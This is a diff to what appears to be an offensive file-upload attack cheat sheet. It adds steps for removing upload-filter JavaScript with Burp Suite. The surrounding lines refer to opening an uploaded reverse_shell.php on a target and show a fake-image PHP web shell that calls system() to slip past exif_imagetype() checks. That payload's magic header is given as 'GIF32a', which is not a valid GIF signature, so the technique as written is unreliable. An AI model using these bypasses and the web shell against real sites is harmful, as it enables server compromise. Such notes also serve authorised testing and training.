@@ -167,6 +167,30 @@ Access to http://vulnerable.com/path/to/upload/reverse_shell.php in browser.
 
 <br />
 
+## Filter (Client-Side & Server-Side) Bypass
+
+If the target website uses filter JavaScript around file upload, you’ll be able to bypass it by using Burp Suite.
+
+```sh
+On Burp Suite, click "Proxy" tab and "Options".
+
+# Client-Side
+1. Navigate to "Intercept Client Requests" section, click on the top line ("File extension"...) then click "Edit".
+2. The popup will open.
+3. On the popup, find and remove the "|^js$" in the "Match condition", then save the filter.
+
+# Server-Side
+1. Navigate to "Intercept Server Requests" section and check "Intercept responses based on...".
+
+# ----------------------------------------------
+
+1. Turn the intercept on.
+2. On browser, press Ctrl+F5 (hard refresh) to reload the page.
+3. If you found the filtering file (.js), drop it.
+```
+
+<br />
+
 ## Bypass exif_imagetype() for PHP
 
 Fake image file with exploit.php
@@ -177,3 +201,5 @@ Fake image file with exploit.php
 GIF32a
 <?php echo system('whoami'); ?>
 ```
+
+<br />
